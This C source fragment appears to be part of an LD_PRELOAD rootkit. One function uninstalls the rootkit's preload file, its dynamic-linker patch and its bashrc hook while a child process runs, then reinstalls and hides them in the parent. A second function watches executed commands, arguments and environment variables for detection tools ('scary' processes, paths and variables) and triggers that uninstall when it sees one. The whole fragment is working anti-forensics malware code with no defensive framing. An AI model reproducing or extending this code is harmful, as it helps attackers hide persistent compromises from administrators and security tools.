/* uninstall. continue execution in child. reinstall in parent. */
int remove_self(void){
    if(notuser(0)) return VINVALID_PERM;

    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
    ldpatch(preloadpath, OLD_PRELOAD);
#endif
    doiapath(preloadpath, 0);
    rm(preloadpath);
#ifdef ROOTKIT_BASHRC
    rm(BASHRC_PATH);
    rm(BASHRC_PATH);
#endif

    pid_t pid = fork();
    if(pid < 0) return VFORK_ERR;
    else if(pid == 0) return VFORK_SUC;
    int status;
    waitpid(pid, &status, 0);

    if(status == 0){
#ifdef PATCH_DYNAMIC_LINKER
        ldpatch(OLD_PRELOAD, preloadpath);
#endif
        reinstall(preloadpath, NULL, NULL);
        hide_path(preloadpath);
    
        // prevent race codition. (truncated file)
        while(!doiapath(preloadpath, 1))
            reinstall(preloadpath, NULL, NULL);
    }

    return VEVADE_DONE;
}


/* checks all of the scary_* arrays created by setup.py against execve/p args.
 * the scary_procs loop checks the name of the calling process as well. */
int evade(const char *filename, char *const argv[], char *const envp[]){
    if(rknomore()) return VNOTHING_DONE;

    char *scary_proc, *scary_path;

    for(int i = 0; i < SCARY_PROCS_SIZE; i++){
        scary_proc = scary_procs[i];

        char path[strlen(scary_proc) + 3];
        snprintf(path, sizeof(path), "*/%s", scary_proc);

        if(process(scary_proc) || strstr(filename, scary_proc) || !fnmatch(path, filename, FNM_PATHNAME))
            return remove_self();
    }

    for(int i = 0; i < SCARY_PATHS_SIZE; i++){
        scary_path = scary_paths[i];

        for(int argi = 0; argv[argi] != NULL; argi++)
            if(!fnmatch(scary_path, argv[argi], FNM_PATHNAME))
                return remove_self();

        if(!fnmatch(scary_path, filename, FNM_PATHNAME))
            for(int argi = 0; argv[argi] != NULL; argi++)
                if(!strncmp("--list", argv[argi], 6))
                    return remove_self();
    }

    if(envp != NULL)
        for(int i = 0; envp[i] != NULL; i++)
            for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
                if(!strncmp(scary_variables[ii], envp[i], strlen(scary_variables[ii])))
                    return remove_self();

    return VNOTHING_DONE;
}